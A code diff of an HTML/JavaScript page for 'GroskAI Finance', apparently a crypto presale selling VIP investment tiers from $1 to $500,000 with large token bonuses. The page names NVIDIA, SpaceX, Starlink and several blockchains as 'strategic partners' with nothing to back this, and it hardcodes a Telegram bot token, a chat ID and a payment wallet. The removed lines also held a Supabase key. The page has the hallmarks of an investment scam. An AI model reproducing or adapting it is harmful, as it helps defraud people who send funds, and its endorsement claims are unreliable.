@@ -8,94 +8,39 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
-    /* Giữ nguyên style cũ */
     @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap');
     * { font-family: 'Inter', sans-serif; }
-    .no-scrollbar::-webkit-scrollbar { display: none; }
-    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-    body { 
-      background-color: #030712; 
-      background-image: radial-gradient(circle at 25% 0%, rgba(37, 99, 235, 0.08) 0%, rgba(0, 0, 0, 0) 50%);
-      color: #f1f5f9; 
-      margin: 0; 
-      padding: 0; 
-      overflow-x: hidden; 
-    }
-    .glass-card { 
-      background: rgba(17, 24, 39, 0.65);
-      backdrop-filter: blur(12px); 
-      border: 1px solid rgba(59, 130, 246, 0.25); 
-      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.2);
-    }
+    body { background-color: #030712; background-image: radial-gradient(circle at 25% 0%, rgba(37,99,235,0.08) 0%, rgba(0,0,0,0) 50%); color: #f1f5f9; margin: 0; padding: 0; overflow-x: hidden; }
+    .glass-card { background: rgba(17,24,39,0.65); backdrop-filter: blur(12px); border: 1px solid rgba(59,130,246,0.25); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.2); }
     .glow-btn { transition: all 0.2s ease; box-shadow: 0 0 12px rgba(59,130,246,0.3); }
     .glow-btn:hover { box-shadow: 0 0 24px rgba(59,130,246,0.8); transform: translateY(-1px); }
-    .amount-btn-active { 
-      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
-      color: white; 
-      box-shadow: 0 0 15px rgba(59,130,246,0.5);
-      border: none;
-    }
+    .amount-btn-active { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; box-shadow: 0 0 15px rgba(59,130,246,0.5); border: none; }
     @keyframes scrollLeft { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
     .animate-scroll-left { animation: scrollLeft 25s linear infinite; }
-    /* --- MẶC ĐỊNH CHO MOBILE (Tự động sáng, rõ màu, nét căng) --- */
-.partner-logo { 
-  transition: all 0.3s ease; 
-  opacity: 1; 
-  filter: grayscale(0%); /* Hiện màu gốc */
-}
-
-/* Xử lý riêng cho các logo chữ đen trên Mobile (như SpaceX, NVIDIA) -> Chuyển chữ thành màu trắng sáng */
-.logo-dark {
-  filter: invert(1);
-  opacity: 0.9;
-}
-
-/* --- CHỈ ÁP DỤNG HIỆU ỨNG CHÌM/SÁNG KHI DÙNG PC, LAPTOP (Thiết bị có chuột) --- */
-@media (hover: hover) {
-  /* Khi chưa chỉ chuột vào: Logo sẽ hơi chìm và có màu xám */
-  .partner-logo { 
-    opacity: 0.5; 
-    filter: grayscale(100%);
-  }
-  /* Khi chỉ chuột vào: Bùng nổ màu sắc + Phóng to nhẹ */
-  .partner-logo:hover { 
-    opacity: 1; 
-    filter: grayscale(0%);
-    transform: scale(1.08); 
-  }
-  
-  /* Xử lý hiệu ứng di chuột cho logo chữ đen trên PC */
-  .logo-dark {
-    filter: invert(1) opacity(0.5);
-  }
-  .logo-dark:hover {
-    filter: invert(1) opacity(1);
-  }
-}
+    .partner-logo { transition: all 0.3s ease; opacity: 1; filter: grayscale(0%); }
+    .logo-dark { filter: invert(1); opacity: 0.9; }
+    @media (hover: hover) { .partner-logo { opacity: 0.5; filter: grayscale(100%); } .partner-logo:hover { opacity: 1; filter: grayscale(0%); transform: scale(1.08); } .logo-dark { filter: invert(1) opacity(0.5); } .logo-dark:hover { filter: invert(1) opacity(1); } }
     .roadmap-dot { transition: all 0.2s ease; }
     .roadmap-card:hover .roadmap-dot { background-color: #3b82f6; box-shadow: 0 0 0 4px rgba(59,130,246,0.3); }
     ::-webkit-scrollbar { width: 6px; }
     ::-webkit-scrollbar-track { background: #0f172a; }
     ::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 4px; }
+    .vip-progress-bar { background: rgba(255,255,255,0.1); border-radius: 20px; height: 8px; overflow: hidden; }
+    .vip-progress-fill { background: linear-gradient(90deg, #3b82f6, #a855f7); width: 0%; height: 100%; border-radius: 20px; transition: width 0.5s ease; }
   </style>
 </head>
 <body class="relative">
-
   <!-- Hero Section -->
   <div class="relative text-center space-y-3 pt-12 pb-8 px-4">
-    <h1 class="text-5xl md:text-7xl font-black italic tracking-tighter bg-gradient-to-r from-white via-blue-400 to-purple-500 bg-clip-text text-transparent">
-      GroskAI <span class="text-white">Finance</span>
-    </h1>
+    <h1 class="text-5xl md:text-7xl font-black italic tracking-tighter bg-gradient-to-r from-white via-blue-400 to-purple-500 bg-clip-text text-transparent">GroskAI <span class="text-white">Finance</span></h1>
     <p class="text-slate-400 text-sm font-semibold uppercase tracking-widest">Pre-Sales · Buy VIP Packages</p>
     <div class="h-px w-24 bg-gradient-to-r from-transparent via-blue-500 to-transparent mx-auto mt-4"></div>
   </div>
 
   <div class="max-w-6xl mx-auto px-4 py-6">
     <div class="flex flex-col lg:flex-row gap-8">
-      
-      <!-- Left Column: Buy VIP Form -->
+      <!-- Left Column -->
       <div class="lg:w-2/3">
         <div class="glass-card rounded-2xl p-6 md:p-8 space-y-6 backdrop-blur-md">
           <h2 class="text-xl font-bold text-white/90 flex items-center gap-2"><i class="fas fa-rocket text-blue-500"></i> Buy Investment Package</h2>
@@ -124,15 +69,19 @@
             </div>
           </div>
 
-          <!-- Select VIP Package -->
-          <div class="space-y-3">
-            <div class="flex justify-between items-end">
-              <label class="text-[11px] text-slate-400 uppercase font-semibold tracking-wider ml-1">Select Investment Package</label>
-              <div id="bonusInfo" class="text-xs text-emerald-400 font-mono"></div>
+          <!-- VIP Progress -->
+          <div class="space-y-2">
+            <div class="flex justify-between text-xs text-slate-400">
+              <span>VIP Progress</span>
+              <span id="vipProgressText">VIP 0 / 5</span>
             </div>
-            <div id="vipHeader" class="text-3xl font-black bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent"></div>
-            <div id="amountButtons" class="grid grid-cols-2 gap-3"></div>
+            <div class="vip-progress-bar">
+              <div id="vipProgressFill" class="vip-progress-fill" style="width: 0%;"></div>
+            </div>
           </div>
+
+          <!-- Dynamic VIP Content -->
+          <div id="dynamicVipContent" class="space-y-4"></div>
 
           <!-- Payment Info -->
           <div class="bg-black/30 rounded-xl p-4 space-y-3">
@@ -153,97 +102,30 @@
         </div>
       </div>
 
-      <!-- Right Column: Smart Contract + Tokenomics -->
+      <!-- Right Column -->
       <div class="lg:w-1/3 space-y-6">
         <div class="glass-card rounded-2xl p-5">
-          <div class="flex items-center gap-2 mb-3">
-            <i class="fas fa-file-contract text-blue-500 text-sm"></i>
-            <span class="text-[11px] text-slate-400 font-bold uppercase tracking-wider">Smart Contract</span>
-          </div>
-          <div class="bg-black/40 rounded-xl p-3 flex items-center justify-between gap-2">
-            <code id="contractAddr" class="text-xs text-blue-200/80 font-mono break-all">0xc33a186374a2c5360a0ad06b3131ecbb9043c32a</code>
-            <button onclick="copyContract()" class="text-slate-400 hover:text-white transition"><i class="far fa-copy"></i></button>
-          </div>
+          <div class="flex items-center gap-2 mb-3"><i class="fas fa-file-contract text-blue-500 text-sm"></i><span class="text-[11px] text-slate-400 font-bold uppercase tracking-wider">Smart Contract</span></div>
+          <div class="bg-black/40 rounded-xl p-3 flex items-center justify-between gap-2"><code id="contractAddr" class="text-xs text-blue-200/80 font-mono break-all">0xc33a186374a2c5360a0ad06b3131ecbb9043c32a</code><button onclick="copyContract()" class="text-slate-400 hover:text-white transition"><i class="far fa-copy"></i></button></div>
         </div>
         <div class="glass-card rounded-2xl p-5">
           <h3 class="text-sm font-bold text-white/80 mb-3 flex items-center gap-2"><i class="fas fa-chart-pie text-blue-500"></i> Tokenomics</h3>
-          <div class="space-y-2">
-            <div class="flex justify-between text-xs"><span class="text-slate-400">Pre-sales</span><span class="font-mono text-blue-300">20%</span></div>
-            <div class="flex justify-between text-xs"><span class="text-slate-400">Liquidity</span><span class="font-mono text-blue-300">50%</span></div>
-            <div class="flex justify-between text-xs"><span class="text-slate-400">Team & Marketing</span><span class="font-mono text-blue-300">30%</span></div>
-          </div>
+          <div class="space-y-2"><div class="flex justify-between text-xs"><span class="text-slate-400">Pre-sales</span><span class="font-mono text-blue-300">20%</span></div><div class="flex justify-between text-xs"><span class="text-slate-400">Liquidity</span><span class="font-mono text-blue-300">50%</span></div><div class="flex justify-between text-xs"><span class="text-slate-400">Team & Marketing</span><span class="font-mono text-blue-300">30%</span></div></div>
         </div>
       </div>
     </div>
 
     <!-- Partners Logo Scrolling -->
-   <div class="mt-16 py-8 border-y border-white/10">
-      <p class="text-center text-xs text-slate-500 uppercase tracking-wider mb-8">Đối tác chiến lược & Nhà đầu tư</p>
-      
-      <div class="relative w-full overflow-hidden flex items-center h-16">
-        <div class="flex animate-scroll-left w-max">
-          
-          <div class="flex items-center gap-12 md:gap-20 px-6 shrink-0">
-            <img alt="BNB Chain" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/bnb-bnb-logo.png">
-            <img alt="NVIDIA" class="partner-logo logo-dark h-[25px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/a/a4/NVIDIA_logo.svg">
-            <img alt="SpaceX" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/2e/SpaceX_logo_black.svg">
-            <img alt="Starlink" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/29/Starlink_Logo.svg">
-            <img alt="Mantle" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/mantle-mnt-logo.png">
-            <img alt="Ethereum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/ethereum-eth-logo.png">
-            <img alt="Polygon" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/polygon-matic-logo.png">
-            <img alt="Solana" class="partner-logo h-[30px] object-contain shrink-0" src="https://cryptologos.cc/logos/solana-sol-logo.png">
-            <img alt="Arbitrum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/arbitrum-arb-logo.png">
-            <img alt="Chainlink" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/chainlink-link-logo.png">
-          </div>
-
-          <div class="flex items-center gap-12 md:gap-20 px-6 shrink-0">
-            <img alt="BNB Chain" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/bnb-bnb-logo.png">
-            <img alt="NVIDIA" class="partner-logo logo-dark h-[25px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/a/a4/NVIDIA_logo.svg">
-            <img alt="SpaceX" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/2e/SpaceX_logo_black.svg">
-            <img alt="Starlink" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/29/Starlink_Logo.svg">
-            <img alt="Mantle" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/mantle-mnt-logo.png">
-            <img alt="Ethereum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/ethereum-eth-logo.png">
-            <img alt="Polygon" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/polygon-matic-logo.png">
-            <img alt="Solana" class="partner-logo h-[30px] object-contain shrink-0" src="https://cryptologos.cc/logos/solana-sol-logo.png">
-            <img alt="Arbitrum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/arbitrum-arb-logo.png">
-            <img alt="Chainlink" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/chainlink-link-logo.png">
-          </div>
-          
-        </div>
-      </div>
+    <div class="mt-16 py-8 border-y border-white/10">
+      <p class="text-center text-xs text-slate-500 uppercase tracking-wider mb-8">Strategic Partners & Investors</p>
+      <div class="relative w-full overflow-hidden flex items-center h-16"><div class="flex animate-scroll-left w-max"><div class="flex items-center gap-12 md:gap-20 px-6 shrink-0"><img alt="BNB Chain" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/bnb-bnb-logo.png"><img alt="NVIDIA" class="partner-logo logo-dark h-[25px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/a/a4/NVIDIA_logo.svg"><img alt="SpaceX" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/2e/SpaceX_logo_black.svg"><img alt="Starlink" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/29/Starlink_Logo.svg"><img alt="Mantle" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/mantle-mnt-logo.png"><img alt="Ethereum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/ethereum-eth-logo.png"><img alt="Polygon" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/polygon-matic-logo.png"><img alt="Solana" class="partner-logo h-[30px] object-contain shrink-0" src="https://cryptologos.cc/logos/solana-sol-logo.png"><img alt="Arbitrum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/arbitrum-arb-logo.png"><img alt="Chainlink" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/chainlink-link-logo.png"></div><div class="flex items-center gap-12 md:gap-20 px-6 shrink-0"><img alt="BNB Chain" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/bnb-bnb-logo.png"><img alt="NVIDIA" class="partner-logo logo-dark h-[25px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/a/a4/NVIDIA_logo.svg"><img alt="SpaceX" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/2e/SpaceX_logo_black.svg"><img alt="Starlink" class="partner-logo logo-dark h-[20px] object-contain shrink-0" src="https://upload.wikimedia.org/wikipedia/commons/2/29/Starlink_Logo.svg"><img alt="Mantle" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/mantle-mnt-logo.png"><img alt="Ethereum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/ethereum-eth-logo.png"><img alt="Polygon" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/polygon-matic-logo.png"><img alt="Solana" class="partner-logo h-[30px] object-contain shrink-0" src="https://cryptologos.cc/logos/solana-sol-logo.png"><img alt="Arbitrum" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/arbitrum-arb-logo.png"><img alt="Chainlink" class="partner-logo h-[35px] object-contain shrink-0" src="https://cryptologos.cc/logos/chainlink-link-logo.png"></div></div></div>
     </div>
 
     <!-- Roadmap -->
     <div class="my-16">
       <h2 class="text-2xl font-bold text-center mb-2">Development Roadmap</h2>
       <p class="text-center text-slate-400 text-sm mb-10">The journey to conquer decentralized AI</p>
-      <div class="grid md:grid-cols-3 gap-6">
-        <div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-blue-500">
-          <div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-blue-500"></div>
-          <span class="text-xs text-blue-400 font-mono">Phase 1 · 2025</span>
-          <h3 class="text-lg font-bold mt-2">AI Development</h3>
-          <p class="text-slate-400 text-sm mt-2">Building AI platform and proprietary algorithms for GroskAI.</p>
-        </div>
-        <div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-blue-500">
-          <div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-blue-500"></div>
-          <span class="text-xs text-blue-400 font-mono">Phase 2 · 2025</span>
-          <h3 class="text-lg font-bold mt-2">Strategic Partners</h3>
-          <p class="text-slate-400 text-sm mt-2">Connecting global strategic partners in AI and Blockchain.</p>
-        </div>
-        <div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.3)]">
-          <div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></div>
-          <span class="text-xs text-blue-400 font-mono">Phase 3 · 2026 (Ongoing)</span>
-          <h3 class="text-lg font-bold mt-2">Pre-sales Launch</h3>
-          <p class="text-slate-400 text-sm mt-2">Token sale, launch AI Chat and first ecosystem features.</p>
-          <span class="inline-block mt-3 text-[10px] font-bold text-green-400 bg-green-400/10 px-2 py-1 rounded-full">Live</span>
-        </div>
-        <div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-white/20">
-          <div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-white/30"></div>
-          <span class="text-xs text-slate-500 font-mono">Phase 4 · Q3 2026</span>
-          <h3 class="text-lg font-bold mt-2 text-white/60">Mainnet & Listing</h3>
-          <p class="text-slate-500 text-sm mt-2">Launch Mainnet, list on top-tier exchanges.</p>
-        </div>
-      </div>
+      <div class="grid md:grid-cols-3 gap-6"><div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-blue-500"><div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-blue-500"></div><span class="text-xs text-blue-400 font-mono">Phase 1 · 2025</span><h3 class="text-lg font-bold mt-2">AI Development</h3><p class="text-slate-400 text-sm mt-2">Building AI platform and proprietary algorithms for GroskAI.</p></div><div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-blue-500"><div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-blue-500"></div><span class="text-xs text-blue-400 font-mono">Phase 2 · 2025</span><h3 class="text-lg font-bold mt-2">Strategic Partners</h3><p class="text-slate-400 text-sm mt-2">Connecting global strategic partners in AI and Blockchain.</p></div><div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.3)]"><div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></div><span class="text-xs text-blue-400 font-mono">Phase 3 · 2026 (Ongoing)</span><h3 class="text-lg font-bold mt-2">Pre-sales Launch</h3><p class="text-slate-400 text-sm mt-2">Token sale, launch AI Chat and first ecosystem features.</p><span class="inline-block mt-3 text-[10px] font-bold text-green-400 bg-green-400/10 px-2 py-1 rounded-full">Live</span></div><div class="roadmap-card glass-card rounded-xl p-5 relative border-l-4 border-white/20"><div class="roadmap-dot absolute -left-[9px] top-6 w-3 h-3 rounded-full bg-white/30"></div><span class="text-xs text-slate-500 font-mono">Phase 4 · Q3 2026</span><h3 class="text-lg font-bold mt-2 text-white/60">Mainnet & Listing</h3><p class="text-slate-500 text-sm mt-2">Launch Mainnet, list on top-tier exchanges.</p></div></div>
     </div>
   </div>
 
@@ -252,11 +134,6 @@
     const TG_BOT_TOKEN = '8646366529:AAHjpNp6B5uM0_o4V0GVUHL5MLLon78xnQA';
     const TG_CHAT_ID = '-1002173214293';
     const RECIPIENT_WALLET = '0xc33a186374a2c5360a0ad06b3131ecbb9043c32a';
-    // ===================================================
-
-    const SUPABASE_URL = 'https://ihuglkphzdhagzaomksg.supabase.co';
-    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlodWdsa3BoemRoYWd6YW9ta3NnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkxOTg5MjIsImV4cCI6MjA5NDc3NDkyMn0.jepUTXPclTckTiyi7Jr7rT2rnrcyPshboOlDHbvdwFQ';
-    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
     
     const VIP_LEVELS = {
       1: { name: 'VIP 1', nextLevel: 2, packages: [{ usd: 1, bonus: 10 }, { usd: 1000, bonus: 10 }] },
@@ -266,7 +143,6 @@
       5: { name: 'VIP PRO', nextLevel: null, packages: [{ usd: 500000, bonus: 100 }] }
     };
     const GROSKAI_BASE_RATE = 10;
-    let currentLevel = 1;
     let selectedPackage = null;
     let coinPrices = { USDT: 1, BNB: 600, ETH: 3500, SOL: 150 };
     let currentCurrency = 'USDT';
@@ -276,89 +152,30 @@
     let provider = null;
     let signer = null;
     let currentUserVIP = 0;
-    let currentUserId = null;
 
     const networkConfigs = {
-      '0x38': { 
-        chainId: '0x38', 
-        chainName: 'BNB Smart Chain Mainnet', 
-        rpcUrls: ['https://bsc-dataseed1.binance.org/', 'https://bsc-dataseed2.binance.org/', 'https://rpc.ankr.com/bsc'], 
-        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, 
-        blockExplorerUrls: ['https://bscscan.com/'] 
-      },
-      '0x1': { 
-        chainId: '0x1', 
-        chainName: 'Ethereum Mainnet', 
-        rpcUrls: ['https://cloudflare-eth.com', 'https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'], 
-        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 }, 
-        blockExplorerUrls: ['https://etherscan.io/'] 
-      }
+      '0x38': { chainId: '0x38', chainName: 'BNB Smart Chain Mainnet', rpcUrls: ['https://bsc-dataseed1.binance.org/'], nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, blockExplorerUrls: ['https://bscscan.com/'] },
+      '0x1': { chainId: '0x1', chainName: 'Ethereum Mainnet', rpcUrls: ['https://cloudflare-eth.com'], nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 }, blockExplorerUrls: ['https://etherscan.io/'] }
     };
 
-    // ========== IFRAME SOLUTION: get provider from parent ==========
-    function getEthProvider() {
-      try {
-        if (window.parent && window.parent.ethereum) {
-          return window.parent.ethereum;
-        }
-      } catch (e) {
-        console.warn("Cannot access parent.ethereum, fallback to window.ethereum");
-      }
-      return window.ethereum;
-    }
-
-    // Switch network with toast on success (no OK button)
+    function getEthProvider() { try { if (window.parent && window.parent.ethereum) return window.parent.ethereum; } catch(e) {} return window.ethereum; }
+    
     async function switchNetwork(targetChainIdHex, networkParams) {
       const eth = getEthProvider();
-      if (!eth) {
-        Swal.fire('Error', 'Wallet not found (MetaMask/Trust Wallet).', 'error');
-        return false;
-      }
+      if (!eth) { Swal.fire('Error', 'Wallet not found.', 'error'); return false; }
       try {
-        await eth.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: targetChainIdHex }]
-        });
-        // Success: show toast without confirm button
-        Swal.fire({
-          icon: 'success',
-          title: 'Successfully changed network',
-          toast: true,
-          position: 'top-end',
-          timer: 2000,
-          showConfirmButton: false
-        });
+        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: targetChainIdHex }] });
+        Swal.fire({ icon: 'success', title: 'Successfully changed network', toast: true, timer: 2000, showConfirmButton: false });
         return true;
       } catch (switchError) {
         if (switchError.code === 4902) {
           try {
-            await eth.request({
-              method: 'wallet_addEthereumChain',
-              params: [networkParams]
-            });
-            await eth.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: targetChainIdHex }]
-            });
-            Swal.fire({
-              icon: 'success',
-              title: 'Successfully changed network',
-              toast: true,
-              position: 'top-end',
-              timer: 2000,
-              showConfirmButton: false
-            });
+            await eth.request({ method: 'wallet_addEthereumChain', params: [networkParams] });
+            await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: targetChainIdHex }] });
+            Swal.fire({ icon: 'success', title: 'Successfully changed network', toast: true, timer: 2000, showConfirmButton: false });
             return true;
-          } catch (addError) {
-            console.error("Add network error:", addError);
-            Swal.fire('Cannot add network', 'Please add it manually in your wallet.', 'error');
-            return false;
-          }
-        } else {
-          console.error("Switch network error:", switchError);
-          Swal.fire('Cannot switch network', `Please manually switch to ${networkParams.chainName || 'the correct network'} in your wallet.`, 'error');
-          return false;
-        }
+          } catch (addError) { Swal.fire('Cannot add network', 'Please add manually.', 'error'); return false; }
+        } else { Swal.fire('Cannot switch network', `Please manually switch to ${networkParams.chainName}`, 'error'); return false; }
       }
     }
 
@@ -372,43 +189,71 @@
       return true;
     }
 
-    window.selectTokenWithNetwork = async function(symbol, text, icon, netIcon, contract, decimals, chainIdHex) {
-      sessionStorage.setItem('pendingToken', JSON.stringify({
-        symbol, text, icon, netIcon, contract, decimals, chainIdHex
-      }));
-      Swal.fire({ title: 'Processing...', text: 'Preparing network switch', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
-      const networkParams = networkConfigs[chainIdHex];
-      if (!networkParams) {
-        Swal.close();
-        Swal.fire('Error', 'Network configuration not found', 'error');
+    // ===================== LOCAL STORAGE ONLY (no Supabase) =====================
+    function loadUserVIPFromLocalStorage(wallet) {
+      if (!wallet) return 0;
+      const normalizedWallet = wallet.toLowerCase();
+      const key = `vip_${normalizedWallet}`;
+      const stored = localStorage.getItem(key);
+      const vip = stored ? parseInt(stored, 10) : 0;
+      console.log(`Loaded VIP for ${normalizedWallet}: ${vip}`);
+      return vip;
+    }
+
+    function saveUserVIPToLocalStorage(wallet, vipLevel) {
+      if (!wallet) return;
+      const normalizedWallet = wallet.toLowerCase();
+      const key = `vip_${normalizedWallet}`;
+      localStorage.setItem(key, vipLevel);
+      console.log(`Saved VIP ${vipLevel} for ${normalizedWallet}`);
+    }
+
+    // ===================== RENDER DYNAMIC CONTENT =====================
+    function renderDynamicContent() {
+      const container = document.getElementById('dynamicVipContent');
+      if (!container) return;
+      const nextLevel = currentUserVIP + 1;
+      if (nextLevel > 5) {
+        container.innerHTML = `<div class="text-center py-8"><i class="fas fa-trophy text-5xl text-yellow-500 mb-2"></i><p class="text-xl font-bold">You have completed all VIP levels!</p><p class="text-slate-400">Thank you for your support.</p></div>`;
+        document.getElementById('buyButton').disabled = true;
+        document.getElementById('buyButton').classList.add('opacity-50');
+        document.getElementById('vipProgressFill').style.width = '100%';
+        document.getElementById('vipProgressText').innerText = 'VIP 5 / 5';
         return;
       }
+      document.getElementById('buyButton').disabled = false;
+      document.getElementById('buyButton').classList.remove('opacity-50');
+      const progressPercent = (currentUserVIP / 5) * 100;
+      document.getElementById('vipProgressFill').style.width = progressPercent + '%';
+      document.getElementById('vipProgressText').innerText = `VIP ${currentUserVIP} / 5`;
       
-      const switched = await switchNetwork(chainIdHex, networkParams);
-      if (!switched) {
-        await refreshProviderAndSigner();
+      const levelData = VIP_LEVELS[nextLevel];
+      if (!levelData) return;
+      let html = `
+        <div class="glass-card rounded-xl p-5">
+          <h3 class="text-2xl font-bold text-center mb-4 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">${levelData.name}</h3>
+          <div class="grid grid-cols-2 gap-3">
+      `;
+      levelData.packages.forEach(pkg => {
+        const activeClass = (selectedPackage && selectedPackage.usd === pkg.usd) ? 'amount-btn-active' : 'bg-white/10 text-slate-300 hover:bg-white/20';
+        html += `<button onclick="selectPackage(${pkg.usd}, ${pkg.bonus})" class="py-3 rounded-xl font-semibold transition-all ${activeClass}">$${pkg.usd.toLocaleString()}</button>`;
+      });
+      html += `</div><div class="text-center mt-3 text-emerald-400 text-sm">🎁 +${levelData.packages[0].bonus}% bonus for selected package</div></div>`;
+      container.innerHTML = html;
+      if (!selectedPackage) {
+        selectPackage(levelData.packages[0].usd, levelData.packages[0].bonus);
+      } else {
+        const stillExists = levelData.packages.some(p => p.usd === selectedPackage.usd);
+        if (!stillExists) selectPackage(levelData.packages[0].usd, levelData.packages[0].bonus);
+        else updateCalculations();
       }
-      // Update state
-      currentCurrency = symbol;
-      currentTokenContract = contract;
-      currentTokenDecimals = decimals || 18;
-      document.getElementById('currentIcon').src = icon;
-      document.getElementById('currentNetworkIcon').src = netIcon;
-      document.getElementById('currentText').innerHTML = text;
-      document.getElementById('currencySelect').value = symbol;
-      toggleModal();
-      await refreshProviderAndSigner();
-      updateCalculations();
-      Swal.close();
-      if (!switched) {
-        Swal.fire({ icon: 'warning', title: 'Network not switched', text: 'Please manually switch to the correct network to continue.', toast: true, position: 'top-end', timer: 3000, showConfirmButton: false });
-      }
-    };
-
+    }
+    
     window.selectPackage = function(usd, bonus) {
       selectedPackage = { usd, bonus };
-      const btns = document.querySelectorAll('#amountButtons button');
-      btns.forEach(btn => {
+      // update UI active style
+      const buttons = document.querySelectorAll('#dynamicVipContent .bg-white\\/10, #dynamicVipContent .amount-btn-active');
+      buttons.forEach(btn => {
         if (btn.innerText.includes(usd.toLocaleString())) {
           btn.classList.add('amount-btn-active');
           btn.classList.remove('bg-white/10', 'text-slate-300', 'hover:bg-white/20');
@@ -430,133 +275,64 @@
       document.getElementById('tokenPaySymbol').innerText = currentCurrency;
       const baseToken = usdAmount * GROSKAI_BASE_RATE;
       const bonusToken = baseToken * bonus / 100;
-      const totalToken = baseToken + bonusToken;
-      document.getElementById('tokenReceived').innerText = totalToken.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2});
+      document.getElementById('tokenReceived').innerText = (baseToken + bonusToken).toLocaleString(undefined, { minimumFractionDigits: 2 });
     }
 
-    // Supabase helpers
-    async function getOrCreateUser(wallet) {
-      try {
-        const { data: existing, error: fetchError } = await supabaseClient
-          .from('users')
-          .select('id, current_vip')
-          .eq('wallet_address', wallet)
-          .maybeSingle();
